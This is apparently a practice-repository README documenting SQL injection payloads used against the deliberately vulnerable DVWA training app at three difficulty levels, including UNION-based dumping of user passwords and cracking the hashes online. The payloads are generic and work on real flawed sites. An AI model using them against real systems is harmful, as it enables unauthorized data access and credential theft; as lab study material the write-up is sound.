# DVWA-Practice
Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable.The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface. This repo. contains documentation of the Exploits during my practice session.

Directory: localhost/DVWA-master/vulnerabilities/sqli/

# SQLi - Difficulty:Low
User Id -->


'or 1=1# 


'or'1'='1


' ORDER BY 3#


' ORDER BY 2# 


' UNION SELECT user, password FROM users#       (# for commenting the rest of the statements after the query.)


# SQLi - Difficulty:Medium
inspect--> User Id


<option value="1 or 1=1 UNION SELECT user, password FROM users#">' UNION SELECT username, password FROM users--1</option>

NB: However due to the SQL query not having **quotes** around the parameter, this will not fully protect the query from being altered.
    (View Help & Source Code)
    
    
# SQLi - Difficulty:High
1' or 1=1 UNION SELECT user, password FROM users#

# SQLi - Cracking the Hashes
Set Setting: Low & collect the hashes.


' UNION SELECT user, password FROM users#


Paste it into crackstation.net to get the passwords.

# Additional Help: https://portswigger.net/web-security/sql-injection/union-attacks


